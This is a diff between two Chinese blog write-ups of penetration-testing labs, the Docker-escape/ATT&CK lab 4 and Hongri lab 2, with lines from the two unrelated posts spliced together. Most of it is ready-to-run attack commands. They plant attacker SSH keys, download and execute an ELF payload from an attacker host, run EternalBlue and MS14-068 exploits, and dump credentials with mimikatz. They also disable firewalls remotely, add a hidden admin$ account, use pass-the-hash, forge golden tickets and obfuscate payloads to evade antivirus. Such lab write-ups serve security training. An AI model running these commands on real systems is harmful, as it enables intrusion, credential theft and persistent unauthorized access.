-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cp -avx /tmptest/home/ubuntu/.ssh/id_rsa.pub /tmptest/home/ubuntu/.ssh/authorized_keys </span><br><span class="line"></span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5yY2m0Ji9Sy+zc1/84P9EI+CQqhi6xwyni/k8cnGSjJf333Bncr0pEHDGU+jtaBzMzgX/b+kDAfvfvXNvI15+1SOmpLmM08H4twac2lGLt3fRbKPK6W8a3eNdaP6LVHZ6OXUmSWMBZPUzHHnfpaOIVAqOsFpIsPyn9NEu0Y8PxnVWJd42aI5fRwwL/OUIiQnQynmBnnxfeG54HpVPvVPeF9YfSJblQCkr3DiN9HiI/i6wIK7nZH33O3wEV7PxWjQ/qOhuhL1HFwLXh3FqWW/uqcE/C6UT4KSYcaoKkEe2iFrdjZ53LUsBXpEzxy4Om27SIl2Od/S2o6PW6wmfbe6GlDFITNf+9ZOVCGz5Zt4qewTP0W8kW4oC2eBz2OaaJoE25q1f0OL/28O2n5CSqxCgLx0rZBLsTHSadYD32iOCtY7r5fQdXkJU4C0tzGYJbs3SNJG3yqJ3yG5cMmnKTz8sblW+B3JdDaWUw8artLteb5Bw2b8yVvRRtgZcBWQPLe0= root@kali&#x27; &gt; /tmptest/home/ubuntu/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrmhVWnGEgZWNmpbVC+BMdRKVDjbc78QaCWYMJFxNWSYVayOZEUjYQin4VXwbetNoBGrdT7G1rnK8HNs5iK4u2HClZVhq3uOsWc/QAx0ETT1viv3+rA7JmPWbBNLzYRlEG9OWzvhzxh0cRmQsrX7ngbmcCvaIgQDcFa5NtddEZ4vD5SvumHyABvSL+DygN3ig592aoI2Z65wkYmqV7cBlNuZpZe+L6C7L0LZEXy4dleoaCH4Ks+PcUJ/S4z2ruIpKHktFpdc37DXbXusLxWV9fyD7anFXz5wQ552JT0L7SzD7HQ04OR7DR9dRQ7A1lXDbWrZ7CL1pvTH+L7uhwV7X8qs93pkApiaKDXT4M+uAKLLlwL3cMEL8NM4oWV/PBBm1CfpMNhbj4k3r4c19kec5rlAXCbS/lQKRMtS+mmCvY4QP5MUk6L/adRcC693/m6aqNQVlAk4SJr2yCHP0LwWKV8tH0teBhFVk7lR0A7lz2p+GLdjWYBvsI+8lBs5XBoJ8= root@kali</span><br><span class="line">&#x27; &gt; /tmptest/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210710152531088.png" alt="image-20210710152531088"></p>
-<p>然后再使用ssh连接ubuntu即可，到此我们才真正意义上拿到了ubuntu的webshell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i tmptest ubuntu@192.168.1.6</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210710153607718.png" alt="image-20210710153607718"></p>
-<h3 id="上线宿主机到msf"><a href="#上线宿主机到msf" class="headerlink" title="上线宿主机到msf"></a>上线宿主机到msf</h3><p>这里还是按照之前的方法生成一个elf文件在ubuntu上执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.10:8000/test.elf</span><br><span class="line">chmod 777 test.elf</span><br><span class="line">./test.elf</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210710153833975.png" alt="image-20210710153833975"></p>
-<p>msf设置监听模块接受会话，成功上线</p>
-<p><img src="/images/attck4/image-20210710153906276.png" alt="image-20210710153906276"></p>
-<h2 id="存活探测"><a href="#存活探测" class="headerlink" title="存活探测"></a>存活探测</h2><p>添加183.0/24的路由并设置socks代理把msf带入内网，注意要配置proxychains.conf文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.183.0 255.255.255.0 3</span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210710154126238.png" alt="image-20210710154126238"></p>
-<p>可以使用proxychains配合nmap对整个内网网段进行扫描，但是这里它会一个一个ip+端口的方式去扫描，速度比较慢</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 192.168.183.1/24</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210710154357652.png" alt="image-20210710154357652"></p>
-<p>我这里使用个速度稍微快点的，使用的是kali里面的<code>udp_probe</code>模块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">set rhosts 192.168.183.1-255</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这里可以看到内网中还有两台主机存活，一个是192.168.183.129，一个192.168.183.130，这里注意到130开了一个53端口，这里初步判断130为域控</p>
-<p><img src="/images/attck4/image-20210710154625500.png" alt="image-20210710154625500"></p>
-<h2 id="永恒之蓝尝试"><a href="#永恒之蓝尝试" class="headerlink" title="永恒之蓝尝试"></a>永恒之蓝尝试</h2><p>这里直接上手永恒之蓝先打一波，这里实战的话最好先扫描，因为直接打的话可能会打蓝屏，这里是靶场的原因我就直接上手打了。之前提到过130开了53端口初步判断为域控，所以这里先从129这台主机入手</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/ smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.183.129</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210711164727185.png" alt="image-20210711164727185"></p>
-<p>这里看到永恒之蓝直接打成功了返回了一个SYSTEM权限的meterpreter，这里先进行一个进程迁移，从x86迁移到x64的进程里面</p>
-<p><img src="/images/attck4/image-20210711164908165.png" alt="image-20210711164908165"></p>
-<p>我这里迁移到472这个system进程里面</p>
-<p><img src="/images/attck4/image-20210711164916229.png" alt="image-20210711164916229"></p>
-<p>然后开启一个windows环境下的cmd进行信息搜集</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br><span class="line">net user</span><br><span class="line">net view /domain</span><br></pre></td></tr></table></figure>
-
-
-
-<p>可以看到这里是在DEMO这个域环境里面</p>
-<p><img src="/images/attck4/image-20210711165022348.png" alt="image-20210711165022348"></p>
-<p>ping一下130，能够ping通</p>
-<p><img src="/images/attck4/image-20210711165134837.png" alt="image-20210711165134837"></p>
-<h2 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h2><p>这里获取密码有两种方法，先使用常规方法mimikatz抓取</p>
-<p>使用copy命令上传一个mimikatz，这里<code>tasklist /svc</code>查看进程是没有杀软的那么直接上mimikatz了</p>
-<p>这里出现了一个问题提示我的权限不够不能够获取调试权限</p>
-<p><img src="/images/attck4/image-20210711165731902.png" alt="image-20210711165731902"></p>
-<p>那么这里exit回到meterpreter里面使用令牌窃取SYSTEM权限之后进行mimikatz密码进行抓取</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">inpersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br><span class="line"></span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><img src="/images/attck4/image-20210711165951971.png" alt="image-20210711165951971"></p>
-<p>这里得到域成员<code>douser/Dotest123</code></p>
-<p><img src="/images/attck4/image-20210711170007140.png" alt="image-20210711170007140"></p>
-<p>这里还有一个获取密码的方式就是获取ubuntu执行命令的历史记录，我们知道ubuntu有两个网段，跟129这台主机是在一个域内的，那么可以看一下是否有连接过129这台主机的命令曾经执行过，这里就类似于windows里面的udp凭证被保存了下来</p>
-<p><img src="/images/attck4/image-20210711213023199.png" alt="image-20210711213023199"></p>
-<p><img src="/images/attck4/image-20210711213052863.png" alt="image-20210711213052863"></p>
-<h2 id="域控横向移动"><a href="#域控横向移动" class="headerlink" title="域控横向移动"></a>域控横向移动</h2><p>这里拿到了域成员的帐号和密码，这里我们直接使用一个ptt伪造票据来拿到域控权限，利用mimikatz注入票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::list          //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc TGT_douser@DEMO.com.ccache   //将票据注入</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210711170643083.png" alt="image-20210711170643083"></p>
-<p>这里使用<code>klist</code>查看下票据已经注入进去了</p>
-<p><img src="/images/attck4/image-20210711170714848.png" alt="image-20210711170714848"></p>
-<p>这里直接使用ipc连接域控，注意这里需要用主机名而不能用ip</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-ENS2VR5TR3N</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210711171102615.png" alt="image-20210711171102615"></p>
-<p>这里生成一个正向连接的msf马</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lhost=192.168.1.10 lport=4444 -f exe -o bind.exe</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210711171213256.png" alt="image-20210711171213256"></p>
-<p>使用copy命令复制到DC上后使用sc创建计划任务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;test&quot; /tr C:\Users\Desktop\bind.exe /sc MINUTE /S 192.168.183.130</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210711171322209.png" alt="image-20210711171322209"></p>
-<p>使用sc关闭防火墙</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">sc \\WIN-ENS2VR5TR3N start unablefirewall</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210711171343659.png" alt="image-20210711171343659"></p>
-<p>创建服务执行msf马并用msf接受会话</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create bindshell binpath= &quot;c:\bind.exe&quot;</span><br><span class="line">sc \\WIN-ENS2VR5TR3N start bindshell</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload/meterpreter/bind_tcp</span><br><span class="line">set lhost 192.168.1.10</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210711175143843.png" alt="image-20210711175143843"></p>
-<p>成功接收到DC会话使用<code>getsystem</code>提权到system</p>
-<p><img src="/images/attck4/image-20210711175602085.png" alt="image-20210711175602085"></p>
-<p>上传mimikatz抓取DC密码，得到<code>DEMO qwe123!@#</code></p>
-<p><img src="/images/attck4/image-20210711175735504.png" alt="image-20210711175735504"></p>
-<p>打开DC的远程桌面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210711175843340.png" alt="image-20210711175843340"></p>
-<p>使用socks代理进入内网打开远程桌面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop 192.168.183.130</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/images/attck4/image-20210711175954197.png" alt="image-20210711175954197"></p>
-<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><p>这里拿到域管用户之后可以使用金票进行权限维持，这里我就简单的添加一个隐藏用户进行权限维持</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user admin$ qaz123!@# /add		#添加用户admin$</span><br><span class="line"></span><br><span class="line">net localgroup administrators admin$ /add	#将admin$用户添加到管理员组administrators</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这里再使用<code>net user</code>是看不到这个隐藏用户的</p>
-<p><img src="/images/attck4/image-20210711180651437.png" alt="image-20210711180651437"></p>
+<p><img src="/images/attck2/image-20210707194527522.png" alt="image-20210707194527522"></p>
+<p>使用冰蝎上传到靶机上</p>
+<p><img src="/images/attck2/image-20210707194612575.png" alt="image-20210707194612575"></p>
+<p>执行一下，这里因为有360的原因使用msf的原生马是不能够上线的，会被360拦截</p>
+<p><img src="/images/attck2/image-20210707194842917.png" alt="image-20210707194842917"></p>
+<p>这里我后面使用了一下混淆进行了初步免杀处理，然后上线到了msf</p>
+<p><img src="/images/attck2/image-20210707195135482.png" alt="image-20210707195135482"></p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="socks代理扫描内网"><a href="#socks代理扫描内网" class="headerlink" title="socks代理扫描内网"></a>socks代理扫描内网</h2><p>这里首先添加一个10.10.10.0/24段的路由，方便后续操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">route add 10.10.10.0 255.255.255.0 1</span><br><span class="line"></span><br><span class="line">route print</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/attck2/image-20210707195212367.png" alt="image-20210707195212367"></p>
+<p>使用socks路由把msf带入内网，需要在proxychains.conf里面添加路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/images/attck2/image-20210707195315930.png" alt="image-20210707195315930"></p>
+<p>这时候就可以使用msf中的<code>udp_probe</code>模块对10.10.10.0/24段的主机进行信息搜集，这里发现10段还有另外两台主机，10.10.10.10和10.10.10.201</p>
+<p><img src="/images/attck2/image-20210707215623196.png" alt="image-20210707215623196"></p>
+<p>这里使用常规的nmap对这两个ip进行端口扫描发现什么都没有扫出来，那么这里应该是有防火墙的原因</p>
+<p><img src="/images/attck2/image-20210707220400495.png" alt="image-20210707220400495"></p>
+<h2 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h2><p>这里使用ms17-010模块首先对内网进行扫描一下能不能够通过漏洞直接进行横向移动，注意因为有360的原因这里线程不要调的太高</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhost 10.10.10.0/24</span><br><span class="line">set threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<p>扫描完成后发现这里两台主机都可以利用永恒之蓝，就结束了(吗？)</p>
+<p><img src="/images/attck2/image-20210707203431746.png" alt="image-20210707203431746"></p>
+<p>这里直接利用exp打一波，发现都打失败了，应该是没有开匿名管道的原因</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 10.10.10.80</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/attck2/image-20210707203936194.png" alt="image-20210707203936194"></p>
+<h2 id="msf派生cs会话"><a href="#msf派生cs会话" class="headerlink" title="msf派生cs会话"></a>msf派生cs会话</h2><p>这里我在鼓捣半天之后使用<code>getuid</code>查看了一下当前的权限发现还只是一个user权限，也使用不了mimikatz，因为在cs上提权比较方便，这里就直接msf派生个对话给cs，在cs上进行提权操作</p>
+<p>使用<code>payload-inject</code>把msf的对话派生给msf</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler <span class="literal">true</span></span><br><span class="line">set LHOST <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span></span><br><span class="line">set LPORT <span class="number">5555</span></span><br><span class="line">set SESSION <span class="number">2</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/attck2/image-20210707211428347.png" alt="image-20210707211428347"></p>
+<p>这里在cs创建一个监听host为<code>192.168.1.5</code>，port为5555接受msf的对话</p>
+<p><img src="/images/attck2/image-20210707211432290.png" alt="image-20210707211432290"></p>
+<p>查看下内网ip的信息，dns为10.10.10.10，那么10.10.10.10大概率为域控</p>
+<p><img src="/images/attck2/image-20210707221739681.png" alt="image-20210707221739681"></p>
+<p>查看一下主机信息，证实了猜想</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net computers</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/attck2/image-20210707221926832.png" alt="image-20210707221926832"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>这里因为是一个user权限首先要进行提权操作，使用<code>systeminfo</code>查看补丁情况发现只打了3个补丁，那么可以提权的exp有很多</p>
+<p><img src="/images/attck2/image-20210707212821344.png" alt="image-20210707212821344"></p>
+<p>这里使用<code>ms14-058</code>直接提权到system</p>
+<p><img src="/images/attck2/image-20210707212907721.png" alt="image-20210707212907721"></p>
+<p>使用<code>logonpasswords</code>导出密码</p>
+<p><img src="/images/attck2/image-20210707213444768.png" alt="image-20210707213444768"></p>
+<p>看到这里有一个SID为500的域管的帐号，那么直接可以用psexec进行hash传递横向移动</p>
+<p><img src="/images/attck2/image-20210707213513490.png" alt="image-20210707213513490"></p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>这里首先扫描一下网段下的主机</p>
+<p><img src="/images/attck2/image-20210707215226861.png" alt="image-20210707215226861"></p>
+<p>和基本判断的一致，内网下有3台主机</p>
+<p><img src="/images/attck2/image-20210707222112599.png" alt="image-20210707222112599"></p>
+<p>这里使用80主机进行psexec操作</p>
+<p><img src="/images/attck2/image-20210707222133082.png" alt="image-20210707222133082"></p>
+<p>这里psexec执行了但是没有主机上线，这里想起来psexec是需要在防火墙关闭的情况下才能够进行pth的，所以这里尝试一下先ipc连接关闭防火墙后再进行psexec横向移动</p>
+<p><img src="/images/attck2/image-20210707222309401.png" alt="image-20210707222309401"></p>
+<p>使用ipc与10.10.10.10进行连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.10\ipc$ 1qaz@WSX /user:Administrator</span><br><span class="line">shell net use</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/attck2/image-20210707222548552.png" alt="image-20210707222548552"></p>
+<p>使用sc创建计划任务立即执行关闭域控防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\10.10.10.10 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;    </span><br><span class="line">sc \\10.10.10.10 start unablefirewall    </span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里关闭之后psexec还是没有成功，是因为这里DC只有内网ip，所以这里需要用到web进行中转操作才能够上线cs</p>
+<p><img src="/images/attck2/image-20210707222553760.png" alt="image-20210707222553760"></p>
+<p>这里我用到cs的smb beacon进行流量中转，首先建立监听一个smb beacon</p>
+<p><img src="/images/attck2/image-20210707223442558.png" alt="image-20210707223442558"></p>
+<p>再使用smb beacon进行psexec</p>
+<p><img src="/images/attck2/image-20210707223341691.png" alt="image-20210707223341691"></p>
+<p>即可上线DC</p>
+<p><img src="/images/attck2/image-20210707223421795.png" alt="image-20210707223421795"></p>
+<p>这里因为拿到了域管的帐号，这里也使用psexec的方式上线cs，这里当时可以使用批量pth进行上线</p>
+<p><img src="/images/attck2/image-20210707223656487.png" alt="image-20210707223656487"></p>
+<p>上线成功</p>
+<p><img src="/images/attck2/image-20210707224258327.png" alt="image-20210707224258327"></p>
+<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><p>这里使用到金票进行权限维持</p>
+<p>首先<code>hashdump</code>出krbtgt的hash值</p>
+<p><img src="/images/attck2/image-20210707224414333.png" alt="image-20210707224414333"></p>
+<p>查看一下SID</p>
+<p><img src="/images/attck2/image-20210707224512621.png" alt="image-20210707224512621"></p>
+<p>在web主机上生成金票</p>
+<p><img src="/images/attck2/image-20210707224936180.png" alt="image-20210707224936180"></p>
+<p>可以看到这里dir域控c盘成功</p>
+<p><img src="/images/attck2/image-20210707225039985.png" alt="image-20210707225039985"></p>
 
     </article>
     <!-- license -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://example.com">Drunkmars</a>
-            <p>原文链接：<a href="http://example.com/2021/08/09/%E8%AE%B0%E4%B8%80%E6%AC%A1docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/">http://example.com/2021/08/09/%E8%AE%B0%E4%B8%80%E6%AC%A1docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</a>
-            <p>发表日期：<a href="http://example.com/2021/08/09/%E8%AE%B0%E4%B8%80%E6%AC%A1docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/">August 9th 2021, 12:00:00 am</a>
-            <p>更新日期：<a href="http://example.com/2021/08/09/%E8%AE%B0%E4%B8%80%E6%AC%A1docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/">October 3rd 2021, 5:45:49 pm</a>
+            <p>原文链接：<a href="http://example.com/2021/07/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">http://example.com/2021/07/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</a>
+            <p>发表日期：<a href="http://example.com/2021/07/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">七月 21日 2021, 12:00:00 凌晨</a>
+            <p>更新日期：<a href="http://example.com/2021/07/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">October 4th 2021, 10:37:20 am</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -877,16 +717,16 @@
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2021/08/16/tomcat/" title="tomcat漏洞大杂烩">
-                    <div class="nextTitle">tomcat漏洞大杂烩</div>
+                <a href="/2021/07/28/%E7%AA%83%E5%8F%96hash/" title="浅谈域环境下布置水坑实现hash窃取">
+                    <div class="nextTitle">浅谈域环境下布置水坑实现hash窃取</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2021/08/04/weblogic/" title="weblogic漏洞大杂烩">
-                    <div class="prevTitle">weblogic漏洞大杂烩</div>
+                <a href="/2021/07/20/redis/" title="redis漏洞总结">
+                    <div class="prevTitle">redis漏洞总结</div>
                 </a>
             
         </li>
@@ -1025,7 +865,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2"><span class="toc-number">2.2.</span> <span class="toc-text">Struts2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat8"><span class="toc-number">2.3.</span> <span class="toc-text">Tomcat8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin4-8-1"><span class="toc-number">2.4.</span> <span class="toc-text">phpmyadmin4.8.1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E9%80%83%E9%80%B8"><span class="toc-number">3.1.</span> <span class="toc-text">docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#privileged%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-number">3.1.1.</span> <span class="toc-text">privileged特权模式逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E5%AE%BF%E4%B8%BB%E6%9C%BA%E5%88%B0msf"><span class="toc-number">3.1.2.</span> <span class="toc-text">上线宿主机到msf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.2.</span> <span class="toc-text">存活探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%B0%9D%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">永恒之蓝尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">获取密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.5.</span> <span class="toc-text">域控横向移动</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.</span> <span class="toc-text">权限维持</span></a></li></ol>
